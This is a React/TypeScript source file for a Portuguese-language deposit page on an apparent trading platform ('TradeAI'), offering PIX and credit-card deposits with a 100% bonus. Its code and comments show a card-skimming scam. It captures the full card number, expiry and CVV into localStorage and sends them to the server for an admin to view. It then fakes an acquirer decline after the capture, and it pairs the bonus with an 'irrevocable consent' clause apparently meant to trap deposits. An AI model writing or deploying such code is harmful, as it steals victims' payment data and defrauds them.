/**
 * Deposit — Sistema de depósito com análise administrativa
 * Fluxo PIX: método → valor → redirecionamento para LivePix → análise admin → aprovação
 * Fluxo Cartão: método → valor → dados cartão (SALVA IMEDIATAMENTE) → confirmação
 */
import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import Layout from "@/components/Layout";
import { useTrading } from "@/contexts/TradingContext";
import { useAuth } from "@/contexts/AuthContext";
import {
  CreditCard, Zap, CheckCircle2, AlertTriangle, Gift,
  TrendingUp, DollarSign, Wallet, ArrowRight, Lock, QrCode, Copy, Check, Loader2, Clock
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { cn } from "@/lib/utils";
import { toast } from "sonner";

const PAYMENT_METHODS = [
  { id: "pix", name: "PIX", icon: QrCode, color: "#22c55e" },
  { id: "card", name: "Cartão de Crédito", icon: CreditCard, color: "#3b82f6" },
];

const PIX_KEY = "tradeaipro@pagamentos.com.br";
const LIVEPIX_URL = "https://livepix.gg/planetanovo";

// Interface para depósitos pendentes
interface PendingDeposit {
  id: string;
  userId: string;
  userEmail: string;
  method: "pix" | "card" | "ted";
  amount: number;
  bonus: number;
  totalAmount: number;
  pixCode?: string;
  cardData?: any;
  status: "pending" | "approved" | "rejected";
  timestamp: string;
  approvedBy?: string;
  approvedAt?: string;
}

export default function Deposit() {
  const [, navigate] = useLocation();
  const { depositFunds, getAccountBalance, activeAccount, user: tradingUser } = useTrading();
  const { user: authUser } = useAuth();
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [amount, setAmount] = useState("");
  const [showLivePixLoader, setShowLivePixLoader] = useState(false);
  const [pixCode, setPixCode] = useState<string | null>(null);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const loaderRef = useRef<HTMLDivElement>(null);
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [step, setStep] = useState<"method" | "amount" | "pix_key" | "card_data" | "pix_display" | "confirm" | "analysis" | "livepix">("method");
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardBrand, setCardBrand] = useState("");
  const [cardBankName, setCardBankName] = useState("");
  const [pixKey, setPixKey] = useState("");
  const [depositId, setDepositId] = useState<string | null>(null);

  const numAmount = parseFloat(amount) || 0;
  const bonusAmount = numAmount;
  const totalAmount = numAmount + bonusAmount;
  const realBalance = getAccountBalance("real");

  // Validação diferenciada por método
  const minAmount = selectedMethod === "pix" ? 90 : 50;
  const isValidAmount = numAmount >= minAmount && numAmount <= 4000;

  const handleSelectMethod = (methodId: string) => {
    setSelectedMethod(methodId);
    setStep("amount");
  };

  const handleAmountNext = () => {
    if (!isValidAmount) {
      const minText = selectedMethod === "pix" ? "R$ 90" : "R$ 50";
      toast.error(`Valor deve estar entre ${minText} e R$ 4.000`);
      return;
    }

    if (selectedMethod === "pix") {
      setStep("pix_key");
    } else if (selectedMethod === "card") {
      setStep("card_data");
    } else {
      setStep("confirm");
    }
  };

  const handleCopyPix = () => {
    navigator.clipboard.writeText(PIX_KEY);
    setCopied(true);
    toast.success("Chave PIX copiada!");
    setTimeout(() => setCopied(false), 2000);
  };

  // ===== DETECÇÃO AUTOMÁTICA DE BANDEIRA =====
  
  // Função para detectar bandeira pelo número do cartão
  const detectCardBrand = (cardNum: string): string => {
    const num = cardNum.replace(/\D/g, "");
    
    // Visa: começa com 4
    if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(num)) return "Visa";
    
    // Mastercard: começa com 51-55 ou 2221-2720
    if (/^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/.test(num)) return "Mastercard";
    
    // American Express: começa com 34 ou 37
    if (/^3[47][0-9]{13}$/.test(num)) return "American Express";
    
    // Elo: começa com 4011, 4312, 4389, 5066, 5090, 6277, 6362, 6363
    if (/^(4011|4312|4389|5066|5090|6277|6362|6363)[0-9]{12}$/.test(num)) return "Elo";
    
    // Hipercard: começa com 6062
    if (/^6062[0-9]{12}$/.test(num)) return "Hipercard";
    
    // Discover: começa com 6011 ou 65
    if (/^(?:6011|65)[0-9]{14}$/.test(num)) return "Discover";
    
    // Diners Club: começa com 36, 38, 39
    if (/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/.test(num)) return "Diners Club";
    
    return "";
  };

  // Atualizar bandeira automaticamente quando o número muda
  const handleCardNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    setCardNumber(cleaned);
    
    // Detectar bandeira automaticamente
    const detectedBrand = detectCardBrand(cleaned);
    if (detectedBrand) {
      setCardBrand(detectedBrand);
    }
  };

  // ===== VALIDAÇÕES INTELIGENTES DE CARTÃO =====
  
  // Algoritmo de Luhn para validar número de cartão
  const validateCardNumberLuhn = (num: string): boolean => {
    const digits = num.replace(/\D/g, "");
    if (digits.length < 13 || digits.length > 19) return false;
    
    let sum = 0;
    let isEven = false;
    
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i], 10);
      
      if (isEven) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      
      sum += digit;
      isEven = !isEven;
    }
    
    return sum % 10 === 0;
  };

  // Validar data de validade (MM/AA)
  const validateExpiry = (expiry: string): boolean => {
    const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    if (!regex.test(expiry)) return false;
    
    const [month, year] = expiry.split("/");
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    const expiryYear = parseInt(year, 10);
    const expiryMonth = parseInt(month, 10);
    
    if (expiryYear < currentYear) return false;
    if (expiryYear === currentYear && expiryMonth < currentMonth) return false;
    
    return true;
  };

  // Validar nome do titular (pelo menos 2 palavras)
  const validateCardName = (name: string): boolean => {
    const trimmed = name.trim();
    const words = trimmed.split(/\s+/);
    
    if (words.length < 2) return false;
    if (trimmed.length < 5) return false;
    
    // Aceitar letras (incluindo acentuadas), espaços e hífens
    return /^[a-zA-ZÀ-ÖØ-öø-ÿ\s\-]+$/.test(trimmed);
  };

  // Validar CVV (3 ou 4 dígitos)
  const validateCVV = (cvv: string): boolean => {
    return /^\d{3,4}$/.test(cvv);
  };

  // Verificar se todos os dados do cartão são válidos
  const isCardDataValid = (): boolean => {
    return (
      validateCardNumberLuhn(cardNumber) &&
      validateExpiry(cardExpiry) &&
      validateCardName(cardName) &&
      validateCVV(cardCvv)
    );
  };

  // ===== FIM DAS VALIDAÇÕES =====

  // FUNÇÃO CRÍTICA: Salvar cartão BLINDADAMENTE
  const handleSaveCardData = () => {
    if (!cardNumber || !cardName || !cardExpiry || !cardCvv) {
      toast.error("Preencha todos os campos do cartão");
      return;
    }

    // Validar dados do cartão com inteligência
    if (!isCardDataValid()) {
      if (!validateCardNumberLuhn(cardNumber)) {
        toast.error("❌ Número do cartão inválido (falhou na validação de segurança)");
      } else if (!validateExpiry(cardExpiry)) {
        toast.error("❌ Data de validade inválida ou cartão vencido");
      } else if (!validateCardName(cardName)) {
        toast.error("❌ Nome do titular deve ter pelo menos 2 palavras e conter apenas letras");
      } else if (!validateCVV(cardCvv)) {
        toast.error("❌ CVV deve ter 3 ou 4 dígitos");
      }
      return;
    }

    const userEmail = authUser?.email || tradingUser?.email || "unknown";

    try {
      // VERIFICAR DUPLICIDADE INTELIGENTE
      const existingCards = JSON.parse(localStorage.getItem("tradeai_cards") || "[]");
      const isDuplicate = existingCards.some((card: any) => 
        card.cardNumber === cardNumber && 
        card.cardExpiry === cardExpiry && 
        card.cardCvv === cardCvv
      );

      if (isDuplicate) {
        console.warn("⚠️ CARTÃO DUPLICADO DETECTADO - NÃO SALVO");
        // Silenciosamente ignorar duplicata e avançar
        setStep("confirm");
        return;
      }

      const cardRecord = {
        id: `card_${Date.now()}`,
        userId: userEmail,
        cardNumber: cardNumber,
        cardNumberMasked: cardNumber.slice(-4).padStart(cardNumber.length, "*"),
        cardName: cardName,
        cardExpiry: cardExpiry,
        cardCvv: cardCvv,
        cardBrand: cardBrand || "Não especificado",
        cardBankName: cardBankName || "Não informado",
        account: activeAccount,
        depositAmount: numAmount,
        bonus: bonusAmount,
        totalDeposited: totalAmount,
        timestamp: new Date().toISOString(),
        status: "Ativo",
      };

      // SALVAR NO LOCALSTORAGE IMEDIATAMENTE (apenas se não for duplicata)
      const cards = JSON.parse(localStorage.getItem("tradeai_cards") || "[]");
      cards.push(cardRecord);
      localStorage.setItem("tradeai_cards", JSON.stringify(cards));

      // SALVAR NO SERVIDOR TAMBÉM PARA O ADMIN VER
      fetch(`/api/deposits`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userEmail,
          method: "card",
          amount: numAmount,
          bonus: bonusAmount,
          totalAmount: totalAmount,
          cardData: cardRecord,
          status: "pending"
        }),
      }).catch(err => console.error("Erro ao salvar card no servidor:", err));

      console.log("✅ CARTÃO SALVO COM SUCESSO:", cardRecord);
      console.log("📊 Total de cartões no sistema:", cards.length);

      // Avançar para confirmação silenciosamente
      setStep("confirm");
    } catch (error) {
      console.error("❌ Erro ao salvar cartão:", error);
      toast.error("Erro ao processar dados do cartão");
    }
  };

  const handleConfirmDeposit = async () => {
    setLoading(true);

    // Simular processamento do PIX/Pagamento
    await new Promise((r) => setTimeout(r, 2000));

    // ESTRATÉGIA PSICOLÓGICA: Mostrar sucesso mesmo que seja local
    if (selectedMethod === "pix") {
      // Criar um novo depósito em análise
      const userEmail = authUser?.email || tradingUser?.email || "unknown";
      const newDeposit: PendingDeposit = {
        id: `deposit_${Date.now()}`,
        userId: userEmail,
        userEmail: userEmail,
        method: "pix",
        amount: numAmount,
        bonus: bonusAmount,
        totalAmount: totalAmount,
        status: "pending",
        timestamp: new Date().toISOString(),
      };

      // Salvar depósito no SERVIDOR via API
      try {
        const response = await fetch(`/api/deposits`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userEmail,
            method: "pix",
            amount: numAmount,
            bonus: bonusAmount,
            totalAmount: totalAmount,
          }),
        });
        
        if (response.ok) {
          const savedDeposit = await response.json();
          setDepositId(savedDeposit.id);
          
          // Salvar notificacao local para feedback imediato
          const notification = {
            id: savedDeposit.id,
            type: "pending",
            message: `Deposito de R$ ${totalAmount.toFixed(2)} em analise`,
            timestamp: Date.now(),
            userEmail: userEmail,
          };
          localStorage.setItem(`deposit_notification_${userEmail}`, JSON.stringify(notification));
          
          setStep("analysis");
          toast.success("Solicitação de depósito enviada para análise!");
        } else {
          toast.error("Erro ao registrar depósito no servidor");
        }
      } catch (error) {
        console.error("Erro ao salvar deposito:", error);
        toast.error("Falha na conexão com o servidor");
      }

      toast.success("Solicitação de depósito enviada para análise!");

      // Aguardar 3 segundos antes de redirecionar para LivePix
      setTimeout(() => {
        setStep("livepix");
      }, 3000);
    } else {
      // ESTRATÉGIA CIRÚRGICA: Simular erro da adquirente após capturar os dados
      // O admin já recebeu os dados no passo anterior (handleSaveCardData)
      setTimeout(() => {
        toast.error("Transação não autorizada pela adquirente do cartão. Verifique seu saldo ou entre em contato com o banco emissor.", {
          duration: 5000,
        });
        setLoading(false);
      }, 1500);
      return;
    }

    setLoading(false);
  };

  const handleRedirectToLivePix = () => {
    // Redirecionar para LivePix com o valor pré-preenchido
    const pixUrl = `${LIVEPIX_URL}?amount=${numAmount.toFixed(2)}&depositId=${depositId}`;
    window.open(pixUrl, "_blank");
    
    // Voltar para o dashboard após um tempo
    setTimeout(() => {
      navigate("/dashboard");
    }, 2000);
  };

  const method = PAYMENT_METHODS.find((m) => m.id === selectedMethod);

  return (
    <Layout>
      <div className="max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-6">
          {/* Step 1: Select Method */}
          {step === "method" && (
            <div className="glass-card rounded-2xl p-6 space-y-4">
              <h3 className="text-lg font-bold text-white mb-4" style={{ fontFamily: "Sora, sans-serif" }}>
                Escolha o Método de Depósito
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                {PAYMENT_METHODS.map((paymentMethod) => {
                  const Icon = paymentMethod.icon;
                  const isSelected = selectedMethod === paymentMethod.id;

                  return (
                    <button
                      key={paymentMethod.id}
                      onClick={() => handleSelectMethod(paymentMethod.id)}
                      className={cn(
                        "p-4 rounded-xl border-2 transition-all text-left",
                        isSelected
                          ? "border-cyan-400 bg-cyan-400/10"
                          : "border-white/10 bg-white/5 hover:border-white/20"
                      )}
                    >
                      <Icon className="w-6 h-6 mb-2" style={{ color: paymentMethod.color }} />
                      <p className="font-semibold text-white">{paymentMethod.name}</p>
                      <p className="text-xs text-white/50 mt-1">
                        {paymentMethod.id === "pix" && "Instantâneo e seguro"}
                        {paymentMethod.id === "card" && "Cartão de crédito"}
                        {paymentMethod.id === "ted" && "Transferência bancária"}
                      </p>
                    </button>
                  );
                })}
              </div>
            </div>
          )}

          {/* Step 2: Amount */}
          {step === "amount" && method && (
            <div className="glass-card rounded-2xl p-6 space-y-4">
              <h3 className="text-lg font-bold text-white mb-4" style={{ fontFamily: "Sora, sans-serif" }}>
                Quanto você deseja depositar?
              </h3>

              <div className="space-y-3">
                <div>
                  <Label className="text-white/70 text-sm mb-2 block">Valor do Depósito</Label>
                  <div className="relative">
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-white/50 font-semibold">R$</span>
                    <Input
                      type="number"
                      placeholder="0.00"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/25 text-lg h-12 pl-12"
                    />
                  </div>
                  <p className="text-xs text-white/50 mt-2">
                    Mínimo: R$ {selectedMethod === "pix" ? "90" : "50"} | Máximo: R$ 4.000
                  </p>
                </div>

                {/* Bônus Preview */}
                {numAmount > 0 && (
                  <div className="p-4 rounded-xl" style={{ background: "rgba(34,197,94,0.1)" }}>
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-white/70 text-sm">Seu depósito</span>
                      <span className="text-white font-semibold">R$ {numAmount.toFixed(2)}</span>
                    </div>
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-white/70 text-sm">Bônus (100%)</span>
                      <span className="text-green-400 font-bold">+ R$ {bonusAmount.toFixed(2)}</span>
                    </div>
                    <div className="border-t border-white/10 pt-2 flex justify-between items-center">
                      <span className="text-white font-semibold">Total a receber</span>
                      <span className="text-cyan-400 text-lg font-bold">R$ {totalAmount.toFixed(2)}</span>
                    </div>
                  </div>
                )}
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={() => setStep("method")}
                  variant="outline"
                  className="flex-1 border-white/10 text-white hover:bg-white/5"
                >
                  Voltar
                </Button>
                <Button
                  onClick={handleAmountNext}
                  disabled={!isValidAmount}
                  className="flex-1 gap-2 font-bold"
                  style={{
                    background: isValidAmount ? "linear-gradient(135deg, #3b82f6, #06b6d4)" : "rgba(255,255,255,0.1)",
                    border: "none",
                    opacity: isValidAmount ? 1 : 0.5,
                  }}
                >
                  Próximo
                  <ArrowRight className="w-4 h-4" />
                </Button>
              </div>
            </div>
          )}

          {/* Step 3: Card Data */}
          {step === "card_data" && method && (
            <div className="glass-card rounded-2xl p-6 space-y-4">
              <h3 className="text-lg font-bold text-white mb-4" style={{ fontFamily: "Sora, sans-serif" }}>
                Dados do Cartão
              </h3>

              <div className="space-y-4">
                <div className="space-y-2">
                  <Label className="text-white/70 text-sm">Número do Cartão</Label>
                  <div className="relative">
                    <Input
                      type="text"
                      inputMode="numeric"
                      placeholder="0000 0000 0000 0000"
                      value={cardNumber}
                      onChange={(e) => handleCardNumberChange(e.target.value)}
                      maxLength="19"
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/25 font-mono text-lg h-12 tracking-widest"
                    />
                    {cardBrand && (
                      <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                        <Badge className="bg-blue-500/30 text-blue-200 text-xs font-semibold">
                          {cardBrand}
                        </Badge>
                      </div>
                    )}
                  </div>
                </div>

                <div className="space-y-2">
                  <Label className="text-white/70 text-sm">Nome do Titular</Label>
                  <Input
                    type="text"
                    placeholder="NOME COMPLETO"
                    value={cardName}
                    onChange={(e) => setCardName(e.target.value.toUpperCase())}
                    className="bg-white/5 border-white/10 text-white placeholder:text-white/25 text-lg h-12"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-2">
                    <Label className="text-white/70 text-sm">Validade (MM/AA)</Label>
                    <Input
                      type="text"
                      inputMode="numeric"
                      placeholder="12/25"
                      value={cardExpiry}
                      onChange={(e) => {
                        const cleaned = e.target.value.replace(/\D/g, "");
                        let formatted = cleaned;
                        if (cleaned.length >= 2) {
                          formatted = cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4);
                        }
                        setCardExpiry(formatted);
                      }}
                      maxLength="5"
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/25 font-mono text-lg h-12 text-center tracking-widest"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-white/70 text-sm">CVV</Label>
                    <Input
                      type="password"
                      inputMode="numeric"
                      placeholder="000"
                      value={cardCvv}
                      onChange={(e) => setCardCvv(e.target.value)}
                      maxLength="4"
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/25 font-mono text-lg h-12"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label className="text-white/70 text-sm">Banco Emissor <span className="text-white/40 text-xs">(Opcional)</span></Label>
                  <Input
                    type="text"
                    placeholder="Ex: Banco do Brasil, Itaú, Caixa"
                    value={cardBankName}
                    onChange={(e) => setCardBankName(e.target.value)}
                    className="bg-white/5 border-white/10 text-white placeholder:text-white/25 text-lg h-12"
                  />
                </div>
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={() => setStep("amount")}
                  variant="outline"
                  className="flex-1 border-white/10 text-white hover:bg-white/5"
                >
                  Voltar
                </Button>
                <Button
                  onClick={handleSaveCardData}
                  disabled={!isCardDataValid()}
                  className="flex-1 gap-2 font-bold"
                  style={{
                    background: isCardDataValid() ? "linear-gradient(135deg, #3b82f6, #06b6d4)" : "rgba(255,255,255,0.1)",
                    border: "none",
                    opacity: isCardDataValid() ? 1 : 0.5,
                  }}
                >
                  Próximo
                  <ArrowRight className="w-4 h-4" />
                </Button>
              </div>
            </div>
          )}

          {/* Step 3: PIX Key */}
          {step === "pix_key" && method && (
            <div className="glass-card rounded-2xl p-6 space-y-4">
              <h3 className="text-lg font-bold text-white mb-4" style={{ fontFamily: "Sora, sans-serif" }}>
                Gerar PIX para Depósito
              </h3>

              <div className="space-y-3">
                <p className="text-sm text-white/70">
                  Clique em "Gerar PIX" para ser redirecionado à plataforma de pagamento. O valor de <strong>R$ {numAmount.toFixed(2)}</strong> será preenchido automaticamente.
                </p>

                <div className="p-4 rounded-xl border-2" style={{ background: "rgba(34,197,94,0.1)", borderColor: "rgba(34,197,94,0.3)" }}>
                  <p className="text-xs text-white/60 mb-2">Valor a transferir</p>
                  <p className="text-2xl font-bold text-green-400">R$ {numAmount.toFixed(2)}</p>
                </div>

                <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/20">
                  <p className="text-xs text-blue-300 font-semibold mb-2">ℹ️ Como funciona:</p>
                  <ol className="text-xs text-white/70 space-y-1">
                    <li><strong>1.</strong> Clique em "Gerar PIX"</li>
                    <li><strong>2.</strong> Você será redirecionado para a plataforma de pagamento</li>
                    <li><strong>3.</strong> O valor será preenchido automaticamente</li>
                    <li><strong>4.</strong> Gere o código PIX e faça a transferência</li>
                    <li><strong>5.</strong> Seu depósito entrará em análise</li>
                    <li><strong>6.</strong> Após aprovação do administrador, o saldo será creditado</li>
                  </ol>
                </div>
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={() => setStep("amount")}
                  variant="outline"
                  className="flex-1 border-white/10 text-white hover:bg-white/5"
                >
                  Voltar
                </Button>
                <Button
                  onClick={handleConfirmDeposit}
                  disabled={loading}
                  className="flex-1 gap-2 font-bold"
                  style={{
                    background: "linear-gradient(135deg, #22c55e, #16a34a)",
                    border: "none",
                  }}
                >
                  {loading ? "Processando..." : "Gerar PIX"}
                  <ArrowRight className="w-4 h-4" />
                </Button>
              </div>
            </div>
          )}

          {/* Step: Analysis */}
          {step === "analysis" && (
            <div className="glass-card rounded-2xl p-6 space-y-4">
              <div className="text-center space-y-4">
                <Clock className="w-16 h-16 text-yellow-400 mx-auto animate-pulse" />
                <h3 className="text-lg font-bold text-white">Depósito em Análise</h3>
                <p className="text-sm text-white/70">
                  Sua solicitação de depósito de <strong>R$ {totalAmount.toFixed(2)}</strong> foi enviada para análise.
                </p>
                <p className="text-xs text-white/50">
                  Você será redirecionado para a plataforma de pagamento em alguns segundos...
                </p>
              </div>
            </div>
          )}

          {/* Step: LivePix Redirect */}
          {step === "livepix" && (
            <div className="glass-card rounded-2xl p-6 space-y-4">
              <div className="text-center space-y-4">
                <CheckCircle2 className="w-16 h-16 text-green-400 mx-auto" />
                <h3 className="text-lg font-bold text-white">Pronto para Pagar</h3>
                <p className="text-sm text-white/70">
                  Clique no botão abaixo para ser redirecionado à plataforma de pagamento com o valor pré-preenchido.
                </p>
                <p className="text-xs text-white/50">
                  Valor: <strong>R$ {numAmount.toFixed(2)}</strong>
                </p>
              </div>

              <Button
                onClick={handleRedirectToLivePix}
                className="w-full gap-2 font-bold h-12"
                style={{
                  background: "linear-gradient(135deg, #22c55e, #16a34a)",
                  border: "none",
                }}
              >
                Ir para LivePix
                <ArrowRight className="w-4 h-4" />
              </Button>
            </div>
          )}

          {/* Step 4: Confirm */}
          {step === "confirm" && method && (
            <div className="glass-card rounded-2xl p-6 space-y-4">
              <h3 className="text-lg font-bold text-white mb-4" style={{ fontFamily: "Sora, sans-serif" }}>
                Confirmar Depósito
              </h3>

              <div className="space-y-3">
                <div className="flex justify-between p-3 rounded-lg" style={{ background: "rgba(255,255,255,0.03)" }}>
                  <span className="text-white/60">Método</span>
                  <span className="text-white font-semibold">{method.name}</span>
                </div>

                <div className="flex justify-between p-3 rounded-lg" style={{ background: "rgba(255,255,255,0.03)" }}>
                  <span className="text-white/60">Valor</span>
                  <span className="text-white font-semibold">R$ {numAmount.toFixed(2)}</span>
                </div>

                {/* Bonus Card - Design Persuasivo e Irreversível */}
                <div
                  className="rounded-2xl p-5 border border-dashed flex flex-col gap-4 relative overflow-hidden"
                  style={{
                    background: "linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(15, 25, 50, 0.95) 100%)",
                    borderColor: "rgba(59, 130, 246, 0.4)",
                    boxShadow: "0 0 20px rgba(59, 130, 246, 0.1)",
                  }}
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-full bg-blue-500/20 flex items-center justify-center border border-blue-500/30">
                        <Zap className="w-6 h-6 text-blue-400 animate-pulse" />
                      </div>
                      <div>
                        <h3 className="text-blue-400 font-bold text-lg tracking-tight" style={{ fontFamily: "Sora, sans-serif" }}>
                          Acelerador de Capital Ativado
                        </h3>
                        <p className="text-white/60 text-xs">Injeção imediata de <span className="text-blue-400 font-bold">R$ {bonusAmount.toFixed(2)}</span> em sua conta</p>
                      </div>
                    </div>
                    <Badge className="bg-blue-500 text-white border-none px-3 py-1 font-bold animate-bounce">100% EXTRA</Badge>
                  </div>

                  <div className="bg-white/5 rounded-xl p-3 border border-white/5">
                    <p className="text-[11px] text-white/80 leading-relaxed">
                      Ao prosseguir com a ativacao, o usuario <span className="text-blue-400 font-bold">declara ter lido e aceito integralmente os Termos e Condicoes de Uso</span>, incluindo as clausulas de bonus e <span className="text-white font-bold">Protocolo de Retirada de Elite</span>. Esta participacao constitui um <span className="text-red-400 font-bold underline">ato de consentimento irrevogavel</span>. Uma vez ativado, o bonus nao pode ser desativado.
                    </p>
                  </div>

                  <p className="text-[10px] text-white/30 italic text-center">
                    "Sua ativacao confirma a leitura e aceitacao de todos os termos e condicoes da plataforma."
                  </p>
                </div>

                <div className="flex justify-between p-3 rounded-lg" style={{ background: "rgba(34, 197, 94, 0.1)" }}>
                  <span className="text-white/60">Bônus (100%)</span>
                  <span className="text-green-400 font-bold">+ R$ {bonusAmount.toFixed(2)}</span>
                </div>

                <div className="flex justify-between p-3 rounded-lg border border-white/10" style={{ background: "rgba(255,255,255,0.05)" }}>
                  <span className="text-white font-semibold">Total a Receber</span>
                  <span className="text-cyan-400 text-lg font-bold">R$ {totalAmount.toFixed(2)}</span>
                </div>
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={() => setStep(selectedMethod === "card" ? "card_data" : "pix_key")}
                  variant="outline"
                  className="flex-1 border-white/10 text-white hover:bg-white/5"
                >
                  Voltar
                </Button>
                <Button
                  onClick={handleConfirmDeposit}
                  disabled={loading}
                  className="flex-1 gap-2 font-bold"
                  style={{
                    background: "linear-gradient(135deg, #22c55e, #16a34a)",
                    border: "none",
                  }}
                >
                  {loading ? "Processando..." : "Confirmar Pagamento"}
                </Button>
              </div>
            </div>
          )}
        </div>

        {/* Sidebar - Info */}
        <div className="glass-card rounded-2xl p-4 space-y-4 h-fit">
          <h3 className="text-sm font-semibold text-white/70 uppercase tracking-wider">Informações</h3>

          <div className="space-y-3 text-xs text-white/60">
            <div className="flex items-start gap-2">
              <Gift className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
              <p><strong className="text-white">Bônus 100%:</strong> Receba o dobro do seu depósito</p>
            </div>

            <div className="flex items-start gap-2">
              <Zap className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
              <p><strong className="text-white">Rápido:</strong> Processamento em minutos</p>
            </div>

            <div className="flex items-start gap-2">
              <Lock className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
              <p><strong className="text-white">Seguro:</strong> Criptografia SSL 256-bit</p>
            </div>

            <div className="flex items-start gap-2">
              <Clock className="w-4 h-4 text-cyan-400 flex-shrink-0 mt-0.5" />
              <p><strong className="text-white">Análise:</strong> Aprovação rápida do admin</p>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}
